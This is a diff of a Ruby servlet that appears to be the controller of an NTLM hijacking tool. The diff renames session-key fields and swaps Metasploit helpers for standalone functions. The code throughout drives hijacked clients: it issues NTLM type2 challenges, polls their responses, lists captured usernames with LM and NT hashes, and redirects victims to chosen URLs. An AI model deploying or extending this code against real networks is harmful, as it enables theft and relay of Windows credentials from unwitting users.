@@ -49,7 +49,7 @@ class ControllerServlet < HTTPServlet::AbstractServlet
 		#  If client exists and has communicated to the controller within
 		#  the configured timeout, add a request in the session database
 		key = req.query['key'] or return '{"status": "no key provided"}'
-		session = Session.find(:first, :conditions => [ "key_id = ?", key])
+		session = Session.find(:first, :conditions => [ "sesskey_id = ?", key])
 		if session != nil then
 			session.function = "static"
 			session.url = "/client/auth/" + srand.to_s
@@ -86,7 +86,7 @@ class ControllerServlet < HTTPServlet::AbstractServlet
 		# well then authentication succeeds! Dutchie passed!
 		
 		key = req.query['key'] or return '{ "status": "no key provided" }'
-		session = Session.find(:first, :conditions => [ "key_id = ?", key])
+		session = Session.find(:first, :conditions => [ "sesskey_id = ?", key])
 		if session != nil then
 			if req.query['type2'] == nil then
 				# attacker supplied data vs. base64 type2 message
@@ -104,12 +104,12 @@ class ControllerServlet < HTTPServlet::AbstractServlet
 				rescue
 					return '{ "status": "error processing request flags or no flags provided" }'
 				end
-				type2 = Rex::Proto::SMB::Utils.create_type2_message(reqflags, nonce, domain, server, dns_name, dns_domain, downgrade=false)
+				type2 = NTLMFUNCS.create_type2_message(reqflags, nonce, domain, server, dns_name, dns_domain, downgrade=false)
 			else
 				type2 = req.query['type2']
 			end
 			
-			decode = Rex::Text.decode_base64(type2)
+			decode = Base64.decode64(type2)
 			if decode[8] == 2 then
 				# we have a type 2 request, add request!
 				session.function = "type2"
@@ -122,7 +122,7 @@ class ControllerServlet < HTTPServlet::AbstractServlet
 				response = '{ "status": "no response" }'
 				(1..5).each do |loopcicle|
 					sleep($config['timeout']/1000)	# timeout is in milliseconds
-					session = Session.find(:first, :conditions => [ "key_id = ?", key ])
+					session = Session.find(:first, :conditions => [ "sesskey_id = ?", key ])
 					if session != nil then
 						if session.result != nil
 							response = {"status" => "ok", "timestamp" => session.timestamp, "result" => session.result }.to_json
@@ -149,17 +149,17 @@ class ControllerServlet < HTTPServlet::AbstractServlet
 		response['sessions'] = {}
 		sessions = Session.find(:all, :order => "timestamp DESC")
 		sessions.each { |s|
-			response['sessions'][s.key_id] = {}
-			response['sessions'][s.key_id]['timestamp'] = s.timestamp
-			response['sessions'][s.key_id]['function'] = s.function
-			response['sessions'][s.key_id]['url'] = s.url
-			response['sessions'][s.key_id]['nonce'] = s.nonce
-			response['sessions'][s.key_id]['type2'] = s.type2_base64
-			response['sessions'][s.key_id]['domain'] = s.domain
-			response['sessions'][s.key_id]['server'] = s.server
-			response['sessions'][s.key_id]['dns_name'] = s.dns_name
-			response['sessions'][s.key_id]['dns_domain'] = s.dns_domain
-			response['sessions'][s.key_id]['result'] = s.result
+			response['sessions'][s.sesskey_id] = {}
+			response['sessions'][s.sesskey_id]['timestamp'] = s.timestamp
+			response['sessions'][s.sesskey_id]['function'] = s.function
+			response['sessions'][s.sesskey_id]['url'] = s.url
+			response['sessions'][s.sesskey_id]['nonce'] = s.nonce
+			response['sessions'][s.sesskey_id]['type2'] = s.type2_base64
+			response['sessions'][s.sesskey_id]['domain'] = s.domain
+			response['sessions'][s.sesskey_id]['server'] = s.server
+			response['sessions'][s.sesskey_id]['dns_name'] = s.dns_name
+			response['sessions'][s.sesskey_id]['dns_domain'] = s.dns_domain
+			response['sessions'][s.sesskey_id]['result'] = s.result
 		}
 		#print "response: #{response}"
 		
@@ -173,14 +173,14 @@ class ControllerServlet < HTTPServlet::AbstractServlet
 		response['hashes'] = {}
 		users = User.find(:all, :order => "timestamp DESC")
 		users.each { |u|
-			response['hashes'][u.key] = {}
-			response['hashes'][u.key]['timestamp'] = u.timestamp
-			response['hashes'][u.key]['user'] = u.user
-			response['hashes'][u.key]['workstation'] = u.workstation
-			response['hashes'][u.key]['domain'] = u.domain
-			response['hashes'][u.key]['nonce'] = u.nonce
-			response['hashes'][u.key]['lm'] = u.lm
-			response['hashes'][u.key]['nt'] = u.nt
+			response['hashes'][u.sesskey] = {}
+			response['hashes'][u.sesskey]['timestamp'] = u.timestamp
+			response['hashes'][u.sesskey]['user'] = u.user
+			response['hashes'][u.sesskey]['workstation'] = u.workstation
+			response['hashes'][u.sesskey]['domain'] = u.domain
+			response['hashes'][u.sesskey]['nonce'] = u.nonce
+			response['hashes'][u.sesskey]['lm'] = u.lm
+			response['hashes'][u.sesskey]['nt'] = u.nt
 		}
 		#print "response: #{response}"
 		
@@ -198,14 +198,14 @@ class ControllerServlet < HTTPServlet::AbstractServlet
 			response['status'] = "user not found"
 		else
 			users.each { |u|
-					response['hashes'][u.key] = {}
-					response['hashes'][u.key]['timestamp'] = u.timestamp
-					response['hashes'][u.key]['user'] = u.user
-					response['hashes'][u.key]['workstation'] = u.workstation
-					response['hashes'][u.key]['domain'] = u.domain
-					response['hashes'][u.key]['nonce'] = u.nonce
-					response['hashes'][u.key]['lm'] = u.lm
-					response['hashes'][u.key]['nt'] = u.nt
+					response['hashes'][u.sesskey] = {}
+					response['hashes'][u.sesskey]['timestamp'] = u.timestamp
+					response['hashes'][u.sesskey]['user'] = u.user
+					response['hashes'][u.sesskey]['workstation'] = u.workstation
+					response['hashes'][u.sesskey]['domain'] = u.domain
+					response['hashes'][u.sesskey]['nonce'] = u.nonce
+					response['hashes'][u.sesskey]['lm'] = u.lm
+					response['hashes'][u.sesskey]['nt'] = u.nt
 				}
 			end
 
@@ -218,19 +218,19 @@ class ControllerServlet < HTTPServlet::AbstractServlet
 		response = Hash.new
 		response['status'] = "ok"
 		response['sessions'] = {}
-		s = Session.find(:first, :conditions => [ "key_id = ?", key])
+		s = Session.find(:first, :conditions => [ "sesskey_id = ?", key])
 		if s != nil then
-			response['sessions'][s.key_id] = {}
-			response['sessions'][s.key_id]['timestamp'] = s.timestamp
-			response['sessions'][s.key_id]['function'] = s.function
-			response['sessions'][s.key_id]['url'] = s.url
-			response['sessions'][s.key_id]['nonce'] = s.nonce
-			response['sessions'][s.key_id]['type2'] = s.type2_base64
-			response['sessions'][s.key_id]['domain'] = s.domain
-			response['sessions'][s.key_id]['server'] = s.server
-			response['sessions'][s.key_id]['dns_name'] = s.dns_name
-			response['sessions'][s.key_id]['dns_domain'] = s.dns_domain
-			response['sessions'][s.key_id]['result'] = s.result
+			response['sessions'][s.sesskey_id] = {}
+			response['sessions'][s.sesskey_id]['timestamp'] = s.timestamp
+			response['sessions'][s.sesskey_id]['function'] = s.function
+			response['sessions'][s.sesskey_id]['url'] = s.url
+			response['sessions'][s.sesskey_id]['nonce'] = s.nonce
+			response['sessions'][s.sesskey_id]['type2'] = s.type2_base64
+			response['sessions'][s.sesskey_id]['domain'] = s.domain
+			response['sessions'][s.sesskey_id]['server'] = s.server
+			response['sessions'][s.sesskey_id]['dns_name'] = s.dns_name
+			response['sessions'][s.sesskey_id]['dns_domain'] = s.dns_domain
+			response['sessions'][s.sesskey_id]['result'] = s.result
 		else
 			response['status'] = "session key not found"
 		end
@@ -241,7 +241,7 @@ class ControllerServlet < HTTPServlet::AbstractServlet
 	# clear a session
 	def clearsession(req)
 		key = req.query['key'] or return '{ "status": "no session key specified" }'
-		session = Session.find(:first, :conditions => [ "key_id = ?", key])
+		session = Session.find(:first, :conditions => [ "sesskey_id = ?", key])
 		if session != nil then
 			session.function = ""
 			session.url = ""
@@ -266,7 +266,7 @@ class ControllerServlet < HTTPServlet::AbstractServlet
 		key = req.query['key'] or return '{"status": "no key provided"}'
 		url = req.query['url'] or return '{"status": "no url provided"}'
 		response = '{ "status": "ok" }'
-		session = Session.find(:first, :conditions => [ "key_id = ?", key])
+		session = Session.find(:first, :conditions => [ "sesskey_id = ?", key])
 		if session != nil then
 			session.function = "redir"
 			session.url = req.query['url']
